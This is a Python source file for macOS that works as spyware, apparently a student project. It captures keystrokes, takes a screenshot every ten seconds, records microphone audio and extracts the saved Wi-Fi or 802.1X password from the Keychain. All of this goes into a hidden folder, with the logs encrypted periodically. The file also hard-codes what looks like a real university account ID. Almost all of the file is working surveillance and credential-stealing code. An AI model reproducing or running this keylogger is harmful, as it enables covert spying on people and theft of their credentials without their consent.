import subprocess
import logging
import time
import sounddevice as sd  # type: ignore
import soundfile as sf  # type: ignore
import threading
import os
import sys
from pynput import keyboard  # type: ignore
from PIL import ImageGrab
from cryptography.fernet import Fernet

stop_event = threading.Event()


# Creating log directory
log_dir = "/Users/mannatvirk/.hiddenfolder"
os.makedirs(log_dir, exist_ok=True)

# keylog.txt set up
keystroke_logger = logging.getLogger('keystroke_logger')
keystroke_logger.setLevel(logging.INFO)
keystroke_handler = logging.FileHandler(os.path.join(log_dir, "keylog.txt"))
keystroke_handler.setFormatter(logging.Formatter('%(message)s'))
keystroke_logger.addHandler(keystroke_handler)

# log.txt setup
operation_logger = logging.getLogger('operation_logger')
operation_logger.setLevel(logging.INFO)
operation_handler = logging.FileHandler(os.path.join(log_dir, "log.txt"))
operation_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
operation_logger.addHandler(operation_handler)

# generating key for encryption and decryption 
key_file = os.path.join(log_dir, "encryption_key.key")
print(f"log_dir: {log_dir}")

if not os.path.exists(key_file):
    print("Encryption key not found. Generating a new key...")
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
    print("Encryption key generated and saved.")
else:
    print("Encryption key found.")
    with open(key_file, "rb") as f:
        key = f.read()

cipher = Fernet(key)

# SSID to account mapping for 802.1X networks
ssid_to_account = {
    "eduroam": "z5455543@ad.unsw.edu.au",
    "uniwide": "z5455543", 
    # other mappings as needed
}

def take_screenshot():
    try:
        timestamp = int(time.time())
        filename = os.path.join(log_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filename, format="PNG")
        operation_logger.info(f"Screenshot taken and saved to {filename}")
    except Exception as e:
        operation_logger.info(f"Error taking screenshot: {e}")

# continuously take screenshots 
def periodic_screenshots(interval=10):
    while not stop_event.is_set():
        take_screenshot()
        time.sleep(interval)

def on_press(key):
    try:
        # standard keys
        keystroke_logger.handlers[0].stream.write(f"{key.char}")
        keystroke_logger.handlers[0].stream.flush()
    except AttributeError:
        # special keys
        if key == keyboard.Key.space:
            keystroke_logger.handlers[0].stream.write(" ")
        elif key == keyboard.Key.enter:
            keystroke_logger.handlers[0].stream.write("\n")
        else:
            keystroke_logger.handlers[0].stream.write(f"[{key.name}]")
        keystroke_logger.handlers[0].stream.flush()

def record_audio(filename, duration, samplerate=44100, channels=1):
    try:
        recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sd.wait()  # Wait for the recording to complete
        sf.write(filename, recording, samplerate)
        operation_logger.info(f"Audio recording saved to {filename}")
    except Exception as e:
        operation_logger.info(f"Error during audio recording: {e}")

def get_current_wifi_ssid():
    try:
        result = subprocess.check_output(
            "networksetup -getairportnetwork en0",
            shell=True
        ).decode('utf-8').strip()
        if "Current Wi-Fi Network: " in result:
            ssid = result.split(": ")[1]
            return ssid
        else:
            logging.info("No connected Wi-Fi network found.")
            return None
    except subprocess.CalledProcessError:
        logging.info("Failed to get current Wi-Fi network.")
        return None

def get_wifi_password(ssid):
    account = ssid_to_account.get(ssid)
    if account:
        command = f'security find-generic-password -D "802.1X Password" -a "{account}" -w'
    else:
        command = f'security find-generic-password -D "AirPort network password" -s "{ssid}" -w'
    
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True)
        password = result.strip()
        with open(os.path.join(log_dir, "wifi_password.txt"), "w") as f:
            f.write(f"Password for SSID '{ssid}': {password}\n")
        logging.info(f"Password for SSID '{ssid}' saved.")
    except subprocess.CalledProcessError as e:
        logging.info(f"Could not retrieve password for SSID '{ssid}': {e}")
    except Exception as e:
        logging.info(f"Unexpected error: {e}")

def encrypt_file(filepath):
    try:
        if os.path.exists(filepath):
            print(f"Encrypting {filepath}...")
            with open(filepath, "rb") as f:
                file_data = f.read()
            encrypted_data = cipher.encrypt(file_data)
            with open(filepath, "wb") as f:
                f.write(encrypted_data)
            print(f"Encryption of {filepath} completed.")
        else:
            print(f"File {filepath} does not exist.")
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")

def decrypt_file(filepath):
    try:
        if os.path.exists(filepath):
            print(f"Decrypting {filepath}...")  # Debug statement
            with open(filepath, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = cipher.decrypt(encrypted_data)
            with open(filepath, "wb") as f:
                f.write(decrypted_data)
            operation_logger.info(f"Decrypted {filepath} successfully.")
            print(f"Decryption of {filepath} completed.")  # Debug statement
        else:
            operation_logger.info(f"File {filepath} does not exist.")
            print(f"File {filepath} does not exist.")  # Debug statement
    except Exception as e:
        operation_logger.info(f"Error decrypting {filepath}: {e}")
        print(f"Error decrypting {filepath}: {e}")  # Debug statement

#concurrent encryption
def periodic_encryption(interval=60):
    while not stop_event.is_set():
        print("Starting periodic encryption...")
        log_file_path = os.path.join(log_dir, "log.txt")
        keylog_file_path = os.path.join(log_dir, "keylog.txt")
        encrypt_file(log_file_path)
        encrypt_file(keylog_file_path)
        print("Finished periodic encryption.")
        time.sleep(interval)

if __name__ == "__main__":
    print("Starting main execution...")

    # screenshot thread start
    screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
    screenshot_thread.start()
    print("Started screenshot thread.")

    # encryption thread start
    encryption_thread = threading.Thread(target=periodic_encryption, args=(60,), daemon=True)  # Encrypt every 60 seconds
    encryption_thread.start()
    print("Started periodic encryption thread.")

    # audio recording thread start
    audio_filename = os.path.join(log_dir, "audio_rec.wav")
    recording_duration = 300  
    audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
    audio_thread.start()
    print("Started audio recording thread.")

    current_ssid = get_current_wifi_ssid()
    if current_ssid:
        print(f"Current SSID: {current_ssid}")
        get_wifi_password(current_ssid)
    else:
        print("No connected Wi-Fi network found.")
        logging.info("No connected Wi-Fi network found.")

    # keylogger start
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keylogger started.")

    try:
        # keep main program running 
        listener.join()
    except KeyboardInterrupt:
        print("Stopping all operations...")

    # stopping and joining threads 
    stop_event.set()
    screenshot_thread.join()
    encryption_thread.join()
    audio_thread.join()
    print("All threads stopped.")